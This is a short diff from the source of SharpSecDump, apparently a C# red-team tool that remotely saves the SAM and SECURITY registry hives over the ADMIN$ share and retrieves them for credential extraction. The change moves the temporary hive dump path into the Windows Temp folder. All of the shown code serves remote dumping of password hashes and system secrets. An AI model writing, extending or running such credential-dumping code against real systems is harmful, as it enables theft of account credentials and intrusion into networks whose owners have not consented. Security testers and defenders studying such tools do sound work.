@@ -125,8 +125,8 @@ namespace SharpSecDump
             };
 
             //SAM dump stuff starts here
-            string samRemoteLocation = @"\\" + singleTarget + @"\ADMIN$\" + samOut;
-            if (remoteConnection.SaveRegKey("SAM", @"\Windows\" + samOut))
+            string samRemoteLocation = @"\\" + singleTarget + @"\ADMIN$\Temp\" + samOut;
+            if (remoteConnection.SaveRegKey("SAM", @"\Windows\Temp\" + samOut))
             {
                 RegistryHive sam = remoteConnection.GetRemoteHiveDump(samRemoteLocation);
                 if (sam != null)
@@ -141,8 +141,8 @@ namespace SharpSecDump
             }
 
             //Security dump stuff starts here
-            string securityRemoteLocation = @"\\" + singleTarget + @"\ADMIN$\" + securityOut;
-            if (remoteConnection.SaveRegKey("SECURITY", @"\Windows\" + securityOut))
+            string securityRemoteLocation = @"\\" + singleTarget + @"\ADMIN$\Temp\" + securityOut;
+            if (remoteConnection.SaveRegKey("SECURITY", @"\Windows\Temp\" + securityOut))
             {
 
                 RegistryHive security = remoteConnection.GetRemoteHiveDump(securityRemoteLocation);
